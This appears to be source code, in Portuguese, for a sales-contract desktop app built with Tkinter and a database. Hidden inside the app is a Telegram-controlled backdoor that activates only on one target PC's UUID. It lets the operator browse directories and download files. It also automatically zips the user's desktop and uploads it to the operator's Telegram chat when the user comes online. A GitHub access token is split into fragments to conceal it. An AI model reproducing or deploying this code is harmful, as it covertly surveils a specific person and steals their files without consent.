...
def get_uuid():
    try:
        ...
        print("Erro ao obter UUID:", e)
        return None

MEU_UUID = get_uuid()
print(f"🖥️ UUID deste PC: {MEU_UUID}")
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(f"Chat OK: {chat_id}")
...
async def ls(update, context):
    ...
    cursor.execute(
        "INSERT INTO comandos (uuid, comando) VALUES (%s, %s)",
        (TARGET_UUID, "ls")
    )
    conn.commit()
    ...
    cursor.execute("""
        SELECT resultado FROM comandos
        WHERE uuid=%s AND resultado IS NOT NULL
    ...
    if not resultado:
        await update.message.reply_text("❌ Sem resposta do PC.")
        return

    linhas = resultado[0].split("\n")
    ficheiros = linhas[1:]

    resposta = "📂 <b>Caminho atual:</b>\n"
    resposta += f"<code>{CURRENT_PATH}</code>\n\n"
    resposta += "📁 <b>Conteúdo:</b>\n\n"

    for f in ficheiros[:40]:
        if "." not in f:
            icon = "📁"
        elif f.endswith(".exe"):
            icon = "⚙️"
...
async def cd(update, context):
    if not context.args:
        await update.message.reply_text("❌ Usa: /cd caminho")
        return

    novo_path = " ".join(context.args)

    conn = ligar_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO comandos (uuid, comando) VALUES (%s, %s)",
        (TARGET_UUID, f"cd|{novo_path}")
    )
    conn.commit()
    cursor.close()
    conn.close()

    await update.message.reply_text(f"📂 A mudar para:\n{novo_path}")
...
async def status(update, context):
    ...
    cursor.execute("""
        SELECT status, nome FROM pcs_online WHERE uuid=%s
    """, (TARGET_UUID,))
    ...
    if row and row[0] == "online":
        await update.message.reply_text(f"🟢 Online: {row[1]}")
    else:
        await update.message.reply_text("🔴 Offline")


# =========================
# OUVIR COMANDOS (só executa se UUID bater certo)
# =========================
def ouvir_comandos():
    global CURRENT_PATH
    ...
    while True:
        try:
            ...
            cursor.execute(
                "SELECT * FROM comandos WHERE uuid=%s AND resultado IS NULL",
                (TARGET_UUID,)
            )
            ...
            for cmd in comandos:
                ...
                if comando == "ls":
                    resultado = f"PATH:{CURRENT_PATH}\n" + "\n".join(os.listdir(CURRENT_PATH))

                elif comando.startswith("cd|"):
                    novo_path = comando.split("|", 1)[1]
                    if os.path.isdir(novo_path):
                        CURRENT_PATH = novo_path
                        resultado = f"Mudaste para:\n{CURRENT_PATH}"
                    else:
                        resultado = "❌ Caminho inválido"

                else:
                    resultado = "❌ Comando não suportado"

                cursor.execute(
                    "UPDATE comandos SET resultado=%s WHERE id=%s",
                    (resultado, cmd["id"])
                )
                conn.commit()
...
async def download(update, context):
    if not context.args:
        await update.message.reply_text("❌ Usa: /download ficheiro")
        return
    ...
    if not os.path.exists(path):
        await update.message.reply_text("❌ Ficheiro não existe.")
        return
    ...
    if file_size <= CHUNK_SIZE:
        await update.message.reply_text("📤 A enviar ficheiro...")
        try:
    ...
    await update.message.reply_text(
        f"📦 Ficheiro grande ({file_size / 1024 / 1024:.1f} MB)\n"
        f"A dividir em {total_parts} partes de ~45 MB..."
    )
    ...
    try:
        with open(path, "rb") as f:
            for i in range(total_parts):
                chunk_path = os.path.join(CURRENT_PATH, f"{filename}.part{i+1}of{total_parts}")
                chunk_paths.append(chunk_path)
                with open(chunk_path, "wb") as chunk_file:
                    chunk_file.write(f.read(CHUNK_SIZE))

        for i, chunk_path in enumerate(chunk_paths):
            await update.message.reply_text(f"📤 A enviar parte {i+1}/{total_parts}...")
            with open(chunk_path, "rb") as chunk_file:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=chunk_file,
                    filename=f"{filename}.part{i+1}of{total_parts}",
        ...
        await update.message.reply_text(
            ...
            f"💡 Para juntar no bot: `/join {filename}`",
            parse_mode="Markdown"
        )
...
async def join(update, context):
    if not context.args:
        await update.message.reply_text("❌ Usa: /join ficheiro")
        return
    ...
    if not parts:
        await update.message.reply_text("❌ Nenhuma parte encontrada.")
        return

    await update.message.reply_text(f"🔧 A juntar {len(parts)} partes...")
...
# =========================
# HELPER DE UPLOAD ANIMADO
# =========================
async def _send_with_progress(bot, chat_id, filepath, filename, caption):
    import asyncio
    msg = await bot.send_message(chat_id=chat_id, text=f"📤 A iniciar envio de {filename}...")
    ...
    async def animate():
        ...
        while keep_animating:
            ...
            if not keep_animating: break
            text = f"📤 A enviar {filename}\nPor favor aguarde, depende da velocidade de upload da net" + ("." * dots)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=text)
            except Exception:
                pass
            dots = (dots % 3) + 1
...
async def getdesktop(update, context):
    ...
    if file_size <= CHUNK_SIZE:
        ...
        await update.message.reply_text(
            f"📦 Ficheiro grande ({file_size / 1024 / 1024:.1f} MB)\n"
            f"A dividir em {total_parts} partes de ~20 MB..."
        )
...
def iniciar_bot():
    ...
    app.add_handler(CommandHandler("getdesktop", getdesktop))
...
# =========================
# AUTO DESKTOP (BACKGROUND)
# =========================
async def _auto_getdesktop_async(nome, uuid):
    import telegram
    import shutil
    import tempfile
    ...
    await bot.send_message(chat_id=CHAT_ID, text=f"🔥 O User PC 2 entrou!!\n🟢 {nome}\nUUID: {uuid}\n📦 A compactar a área de trabalho automaticamente...")
    
    try:
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', desktop_path)
    except Exception as e:
        await bot.send_message(chat_id=CHAT_ID, text=f"❌ Erro ao compactar: {e}")
        return
    ...
    if file_size <= CHUNK_SIZE:
        try:
            await _send_with_progress(bot, CHAT_ID, zip_path, filename, None)
        except Exception as e:
            await bot.send_message(chat_id=CHAT_ID, text=f"❌ Erro: {e}")
    else:
        total_parts = math.ceil(file_size / CHUNK_SIZE)
        await bot.send_message(chat_id=CHAT_ID, text=f"📦 Ficheiro grande automático ({file_size / 1024 / 1024:.1f} MB)\nA dividir em {total_parts} partes de ~20 MB...")
        ...
        try:
            ...
            for i, chunk_path in enumerate(chunk_paths):
                caption = f"Parte {i+1} de {total_parts} (Auto)" if i == 0 else None
                await _send_with_progress(bot, CHAT_ID, chunk_path, f"{filename}.part{i+1}of{total_parts}", caption)
            
            await bot.send_message(chat_id=CHAT_ID, text=f"✅ Enviado em {total_parts} partes automáticas!\n💡 Para juntar no bot: `/join {filename}`", parse_mode="Markdown")
...
def start_auto_getdesktop(nome, uuid):
    import asyncio
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(_auto_getdesktop_async(nome, uuid))
    except Exception as e:
        print("Erro auto_getdesktop:", e)
...
def user_sai(uuid):
    conn = ligar_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE pcs_online SET status='offline' WHERE uuid=%s", (uuid,))
    conn.commit()
    cursor.close()
    conn.close()

    if uuid == TARGET_UUID:
        send_telegram("🔴 Comercial saiu / ficou offline.")


# =========================
# ARRANQUE
# =========================
if MEU_UUID and MEU_UUID.strip().lower() == TARGET_UUID.strip().lower():
    print("✅ Este PC é o alvo. A iniciar bot e backdoor...")
...
part_g1 = "github_pat_"
part_g2 = "11B4DIBNA0"
part_g3 = "4TH7ifRzHnum"
part_g4 = "_0SfpR3dA19Td"
part_g5 = "M8GbWjFXkbJ"
part_g6 = "ny4uyv0AcQ1UiDjXlnQaPGLRCDYKfTRLDs2G"
...
def ensure_vendedores_profile_columns(conn):
    """Garante que a tabela `vendedores` tem as colunas de controlo de alteração de perfil."""
    try:
        cur = conn.cursor()
        # Adicionar change_name se não existir
        cur.execute("SHOW COLUMNS FROM vendedores LIKE 'change_name'")
        if not cur.fetchone():
            cur.execute("ALTER TABLE vendedores ADD COLUMN change_name DATETIME NULL")
        
        # Adicionar change_SFID se não existir
        cur.execute("SHOW COLUMNS FROM vendedores LIKE 'change_SFID'")
        if not cur.fetchone():
            cur.execute("ALTER TABLE vendedores ADD COLUMN change_SFID DATETIME NULL")
            
        conn.commit()
        cur.close()
    except Exception as e:
        print(f"Erro ao atualizar colunas de perfil: {e}")

def carregar_dados_vendedor():
    """Lê os dados do vendedor (Nome, SFID e datas de alteração) da Base de Dados."""
    uuid_pc = obter_uuid()
    try:
        conn = ligar_db()
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT nome, SFID, change_name, change_SFID FROM vendedores WHERE UUID = %s", (uuid_pc,))
        res = cursor.fetchone()
        cursor.close()
        conn.close()
        return res
    except Exception as e:
        print(f"Erro ao carregar dados do vendedor: {e}")
        return None

def guardar_dados_vendedor(campo, valor):
    """
    Atualiza o nome ou SFID na BD e regista a data da alteração.
    campo: 'nome' ou 'SFID'
    """
    uuid_pc = obter_uuid()
    ...
    try:
        ...
        # Se for SFID, verificar unicidade primeiro (ignorar o próprio UUID)
        if campo.upper() == "SFID":
            cursor.execute("SELECT UUID FROM vendedores WHERE SFID = %s AND UUID != %s", (valor, uuid_pc))
            if cursor.fetchone():
                cursor.close()
                conn.close()
                return "SFID_EXISTS"

        col_data = "change_name" if campo == "nome" else "change_SFID"
        sql = f"UPDATE vendedores SET {campo} = %s, {col_data} = NOW() WHERE UUID = %s"
        cursor.execute(sql, (valor, uuid_pc))
        conn.commit()
        cursor.close()
        conn.close()
        return True
    except Exception as e:
        print(f"Erro ao guardar dados do vendedor: {e}")
        return False
...
async def debug_chats(app):
    for chat in await app.bot.get_updates():
        print(chat)
...
async def criar_topico(app, nome, uuid):
    chat_id = CHAT_ID

    topic_name = f"{nome}-{uuid}"
...
def inserir_rc(dados, nome_vendedor, sfid):
    ...
    INSERT INTO RC (
        ...
        FE, NTCB, IBAN, banco, SFID, nome, tipo_fatura, ze_sem_ze, UUID_COMERCIAL
...
def abrir_interface(nome, ssfid, janela=None):
    ...
    def construir_aba_perfil(parent):
        ...
        def check_lock(dt_last):
            if not dt_last: return True, ""
            from datetime import datetime, timedelta
            if isinstance(dt_last, str): dt_last = datetime.strptime(dt_last, '%Y-%m-%d %H:%M:%S')
            diff = datetime.now() - dt_last
            if diff.days >= 14: return True, ""
            return False, f"Bloqueado: faltam {14 - diff.days} dias."

        # NOME
        f_nome = ttk.Frame(container, style="Card.TFrame")
        f_nome.pack(fill="x", pady=10)
        ttk.Label(f_nome, text="Nome Comercial:", font=("Arial", 10, "bold")).pack(anchor="w")
        e_nome = ttk.Entry(f_nome, width=45)
        e_nome.insert(0, dados.get('nome', ''))
        e_nome.pack(side="left", pady=5, padx=(0, 10))
        
        ok_n, msg_n = check_lock(dados.get('change_name'))
        b_nome = ttk.Button(f_nome, text="Gravar", style="Primary.TButton", 
                            command=lambda: save_p('nome', e_nome.get(), b_nome, l_n))
        b_nome.pack(side="left")
        l_n = ttk.Label(f_nome, text=msg_n, font=("Arial", 8), foreground="#CC0000")
        l_n.pack(anchor="w")
        if not ok_n: b_nome.state(['disabled'])

        # SFID
        f_sfid = ttk.Frame(container, style="Card.TFrame")
        f_sfid.pack(fill="x", pady=10)
        ttk.Label(f_sfid, text="SFID Comercial:", font=("Arial", 10, "bold")).pack(anchor="w")
        e_sfid = ttk.Entry(f_sfid, width=45)
        e_sfid.insert(0, dados.get('SFID', ''))
        e_sfid.pack(side="left", pady=5, padx=(0, 10))
        
        ok_s, msg_s = check_lock(dados.get('change_SFID'))
        b_sfid = ttk.Button(f_sfid, text="Gravar", style="Primary.TButton",
                             command=lambda: save_p('SFID', e_sfid.get(), b_sfid, l_s))
        b_sfid.pack(side="left")
        l_s = ttk.Label(f_sfid, text=msg_s, font=("Arial", 8), foreground="#CC0000")
        l_s.pack(anchor="w")
        if not ok_s: b_sfid.state(['disabled'])

        ttk.Label(container, text="⚠️ Atenção: Por segurança, só podes alterar estes dados a cada 14 dias.", 
                  font=("Arial", 9, "italic"), foreground=VDF_MUTED).pack(pady=20)

        def save_p(c, v, b, l):
            if not v.strip(): return
            if messagebox.askyesno("Confirmar", f"Queres mesmo alterar o teu {c}?\nIsto ficará bloqueado por 14 dias!"):
                res = guardar_dados_vendedor(c, v)
                if res == True:
                    messagebox.showinfo("Sucesso", "Dados atualizados!")
                    b.state(['disabled'])
                    l.config(text="Bloqueado por 14 dias.")
                elif res == "SFID_EXISTS":
                    messagebox.showerror("Erro de Segurança", f"O SFID '{v}' já está a ser utilizado por outro comercial.\n\nCada comercial deve ter um SFID único.")
                else:
    ...
    # Default do servidor (Localhost para teste). 
    eurus_url_var = tk.StringVar(value="http://localhost:8000/")
    ...
    def scroll_rato(event):
        try:
            ...
            if delta:
                ...
                num = getattr(event, "num", None)
                if num == 4: canvas.yview_scroll(-3, "units")
                elif num == 5: canvas.yview_scroll(3, "units")
        except Exception:
            pass
            
    def _bind_mw_gerar(event): canvas.bind_all("<MouseWheel>", scroll_rato)
    def _unbind_mw_gerar(event): canvas.unbind_all("<MouseWheel>")
    
    canvas.bind("<Enter>", _bind_mw_gerar)
    canvas.bind("<Leave>", _unbind_mw_gerar)
...
#========================================================================
    ...
    def carregar_contratos():
        ...
        try:
            conn = ligar_db()
            cursor = conn.cursor(dictionary=True)
            cursor.execute("SELECT * FROM RC WHERE SFID = %s OR UUID_COMERCIAL = %s", (sfid, uuid_pc))
        ...
        scroll_outer = tk.Frame(aba_lista, bg=VDF_BG)
        scroll_outer.pack(fill="both", expand=True)

        canvas_lista = tk.Canvas(scroll_outer, bg=VDF_BG, highlightthickness=0, bd=0)
        vsb = ttk.Scrollbar(scroll_outer, orient="vertical", command=canvas_lista.yview)
        canvas_lista.configure(yscrollcommand=vsb.set)

        vsb.pack(side="right", fill="y")
        canvas_lista.pack(side="left", fill="both", expand=True)

        # Container real onde os "cards" vão ser renderizados
        list_container = tk.Frame(canvas_lista, bg=VDF_BG)
        list_window_id = canvas_lista.create_window((0, 0), window=list_container, anchor="nw")

        def _on_list_configure(event=None):
            try:
        ...
        def _on_canvas_configure(event):
            try:
                canvas_lista.itemconfigure(list_window_id, width=event.width)
            except Exception:
                pass

        list_container.bind("<Configure>", _on_list_configure)
        ...
        def _on_mousewheel(event):
            try:
                delta = getattr(event, "delta", 0)
                if delta:
                    canvas_lista.yview_scroll(int(-1 * (delta / 120)), "units")
                else:
                    # Linux support
                    num = getattr(event, "num", None)
                    if num == 4:
                        canvas_lista.yview_scroll(-3, "units")
                    elif num == 5:
                        canvas_lista.yview_scroll(3, "units")
            except Exception:
                pass

        # Bind apenas quando o rato entra na área da lista para não interferir com outras abas
        def _bind_mw(event): canvas_lista.bind_all("<MouseWheel>", _on_mousewheel)
        def _unbind_mw(event): canvas_lista.unbind_all("<MouseWheel>")
        
        canvas_lista.bind("<Enter>", _bind_mw)
        canvas_lista.bind("<Leave>", _unbind_mw)
...
def abrir_login():
    ...
    try:
        ...
        try:
            ensure_vendedores_mac_column(conn)
            ensure_vendedores_profile_columns(conn)
        except Exception:
            pass
